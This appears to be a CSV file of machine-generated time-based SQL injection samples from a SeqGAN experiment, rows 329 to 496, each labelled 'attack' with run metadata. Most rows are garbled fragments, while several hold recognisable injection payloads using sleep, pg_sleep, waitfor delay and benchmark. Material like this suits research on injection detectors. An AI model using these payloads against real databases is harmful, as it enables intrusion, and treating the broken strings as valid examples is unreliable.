label,payload,family,payload_type,method,run_id,sample_index
attack,1'  t /,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,329
attack,"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,330
attack,"1t%'  =  ''  =  ''  =  'hth)    avl  ' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ftwy)   anm",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,331
attack,   waitfor (yp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,332
attack,"1""   )   ya atf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,333
attack,_,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,334
attack,"1""rhth",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,335
attack,select(  sddo   slirl5q,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,336
attack,"1 or and    )    as ' and   (  'G1""  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,337
attack,"  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,338
attack,1%'  =  '   a    ')   )    )     rsobt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,339
attack,"1%"" where --durandowaitfor",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,340
attack,"' and   (  '""   )    )    rlike sleep  (  5  )   and    (    (   ""nn:8507i0:=select p(  select,0x4c4d6142    and arazz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,341
attack,1 or or 6793  select  zcyvzh'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,342
attack,:5    nox(  s and    )   smdo0  0:fe   andt  sleep    # (  (    (    (  y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,343
attack,"1%%""  =  ""z'  =  ' q",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,344
attack,1%=,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,345
attack,"1'  )   waitfor delay ':""%k'",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,346
attack,"1""  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,347
attack,"1""(  select (  select * pg_sleep  '  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,348
attack,  whereuupqd,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,349
attack,t,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,350
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,351
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%yhy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,352
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '0:        )   )    as 8594 and)    )   xkyfz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,353
attack,rinpm:'  =  ')    rloxkyq  z    a[)   y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,354
attack,"1%'ilhip""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,355
attack,1%v_hy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,356
attack,10'||  (  select 'z<1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'e''   )    )     )   and sleep  (  5  )   and    (    (     (  'k'   )    )     )   and sleep  (  5  )   and    (    (     (  '0_0:Af'wyvx''   )    )     )   and sleep  (  5  )   and    (    (     (  ' e or 6967  5    )   s,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,357
attack,1  ' 3824fgydt  select  =  )  =    p)select)  and    )    a)    and    smike,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,358
attack,"1""   nlinovi'  =  'lfci'  =  'pp'aancv",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,359
attack,1o,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,360
attack,1'||  (  select 'Wor  (  select 6793m,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,361
attack,xdfh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,362
attack,5,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,363
attack,"1""  5rc"" like "" fik'ap",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,364
attack,"1'  6272 et,andvmd7305",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,365
attack,n8252'   )    )     )   and sleep  (  5  )   and    (    (     (  ''  =  'r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,366
attack,"1""  )    anda",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,367
attack,1'  )   waitfor delay ''sa's where from   (      or,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,368
attack,1%b]pkv'  =  'i'  =  ''  =  ''  =  '    aa'  =  ''   )    )     )   and sleep  (  5  )   and    (    (     (  'ty,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,369
attack,  =  )    r asy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,370
attack,5'fqv%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,371
attack,1' xselect from select fromsleep  ' '0:0:2',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,372
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '%'   )    )     )   and sleep  (  5  )   and    (    (     (  ''   )    )     )   waitfor delay 'lp'+  (  select 'idkwhereint",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,373
attack,fy'  =  'y#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,374
attack,  )    )   a)fy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,375
attack,",'  vl)o   s mdkbdd'  =  '   'fegp'",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,376
attack,"hn%ipivo   '  =  'hp,i'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,377
attack,1   si  2044t    j,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,378
attack,"1
",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,379
attack,"""   )    )    rlike sleep  (  5  )   and    (    (   ""ta'  =  'fy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,380
attack,1%rji  y)  =  )    )    )   a,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,381
attack,"selectltl"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""%h1 n'  =  'zhturt",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,382
attack,"1""  xlq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,383
attack,"'  =  '' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '	select like sleep8594  v",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,384
attack,1   or 2239'%'    orstt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,385
attack,1  =  =  5rlin  y    )   r)    (   and  select where sleep  (  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,386
attack,"1"" where 8514 ""zlal""  (    )  yhaw'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,387
attack,"5      )   )    aandfs"" (f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,388
attack,1'  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,389
attack,u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,390
attack,1%/s ' where 1241  =  1241 waitfor delay 'ikb,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,391
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '0:7305af,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,392
attack,1md and where 8594 where 8514  (  )    )   or   )   )    (      w orf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,393
attack,"1%""wy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,394
attack,1'  x,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,395
attack,1 or 8485',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,396
attack,  benchmark  =    where where ori  (  (  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,397
attack,1'    )    )    sya or)a)   a   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,398
attack,18485--iaeh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,399
attack,"1;  ' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 't",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,400
attack,t   a P    where from #  =  benchmark e or 6793    --wp   <>zz   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,401
attack,1o,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,402
attack,1'1210,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,403
attack,"15000000li0:""%""w    benchmark  =      )fa",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,404
attack,1'  )   waitfor delay 'd5    and ift    6967 or where from and    a,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,405
attack,"1""r'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,406
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '  =rpbhs %j",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,407
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  ''  =  ''   )    )     )   and sleep  (  5  )   and    (    (     (  'Gcw'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,408
attack,"1""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,409
attack,1'  )   waitfor delay '0:Dfrom'   )    )     )   and sleep  (  5  )   and    (    (     (  '   s where ormdi'  )   waitfor delay ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,410
attack,  5   (pyqy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,411
attack,"1%s%"" like ""ff",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,412
attack,1m0:73050:pbpifp5000000f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,413
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'Y   st emd    =     jlt \jdtfp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,414
attack,"1""    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,415
attack,'=l 2841yycr',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,416
attack,"1' 8667    ,mkfrom=   )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,417
attack,1  select 2239  =      a   5874    where   =  =  select or e where  =  =     )    cs,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,418
attack,"1""t",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,419
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'n'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,420
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'i0:fff",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,421
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,422
attack,1pdzn'  =  'i'  =  'tjf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,423
attack,"1"" sleep  (    y  )    )  wand 8514  0x544d5a4c  =     u   )  a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,424
attack,"1""p'  )   waitfor delay 'zhlvint",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,425
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,426
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'r  n  5   <>--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,427
attack,"  select sleep  =  select d  =    andru"" where e 6   1915  select  select 7196  5    #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,428
attack,  =   and  (  )    )    aiay,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,429
attack,1c%hqin'  =  'l'  =  'v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,430
attack,1%  =  'y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,431
attack,Ibenchmark  'rnzp'  odk     )   and)    and x    )   awy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,432
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,433
attack,d'kj  tc,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,434
attack,1'  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,435
attack,1iovhlb=f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,436
attack,1%'ehr a' and    (    (     (  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,437
attack,"1""p:bikrh",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,438
attack,select 0o  =  where sleep orarmpg_sleepynzof,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,439
attack,'t  =  ky,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,440
attack,1%'pf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,441
attack,  5    )    )    r'  =  'vo,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,442
attack, 8514 or from sleep5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,443
attack,"1"" 8594 8485  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,444
attack,"h' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'pn'  =  'n5  --yq e 'yfvu' benchmarklt' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'q",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,445
attack,1'  (  oih,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,446
attack,   )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,447
attack,  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,448
attack,1a (  select  s,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,449
attack,' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'inh0p' where 1241  =  1241 waitfor delay '     act,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,450
attack,'t,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,451
attack,1 where and  (  =    (  (  (  select,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,452
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'iso%'  =  ''  =  'h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,453
attack,"1',h )   )   a #ht",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,454
attack,"1""ltiqpkp    ky",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,455
attack,select 9649 e   y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,456
attack,"  select  select ,select=  1210i 6969,2841 sleep3114q and   (  )    as 8514 from6272    #h",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,457
attack,  sleep       a)   )    )     al,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,458
attack,1%'  )   waitfor delay '5000000'  =  'brm waitfor where e 6793    and  select wherelid   and 67938594p9649z,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,459
attack,1'r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,460
attack,10:3672lB'e,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,461
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'pf' and   (  'tf'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,462
attack,1m0:    # (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,463
attack,1    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,464
attack,"in0:1%%""   )    )    rlike sleep  (  5  )   and    (    (   ""  '||  (  select '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,465
attack,1'fs5874y  gpppdpb     'n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,466
attack,i'  0x694a4745    )  )     1210,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,467
attack,"1 2841 6967  5000000,m' and   (  'jbin'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,468
attack,  0x4c4d6142   )    )     like       and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,469
attack,ddanhwf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,470
attack,1  stao 1iolijv'  =  'wi0x544d5a4cjyn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,471
attack,sleep't zlhf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,472
attack,"1'5""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,473
attack,1'rho ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,474
attack,"waitfor' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ir",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,475
attack,idq &,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,476
attack,"1"" )   where",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,477
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'ijU- whererlt  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,478
attack,"1"")   and",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,479
attack,1%'  )    as,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,480
attack,1%y)     and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,481
attack,"    )   )  ""wucy""  =  ' 'rnzp'"" like ""nzoh' like 'zy'  =  ''  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,482
attack,"1%""6969",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,483
attack,1d'  )   waitfor delay 'or(5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,484
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 's'  =  'ohr",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,485
attack,1sleepplph b,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,486
attack,  i fromif8252    =    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,487
attack,1  =  sleep  '    (    a   yf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,488
attack,y5874,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,489
attack,t  select from fromb where * pg_sleep  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,490
attack,bya,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,491
attack,"1%p' and elt  (  1210  =  1210,sleep  (  5   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,492
attack,dZos,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,493
attack,1 from   9649'   )    )     )   and sleep  (  5  )   and    (    (     (  '   as and0x694a4745   )     )   r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,494
attack,pdlt  alihhwu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,495
attack,1%'5 where 4240  'zyhzput e  =  5874,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,496
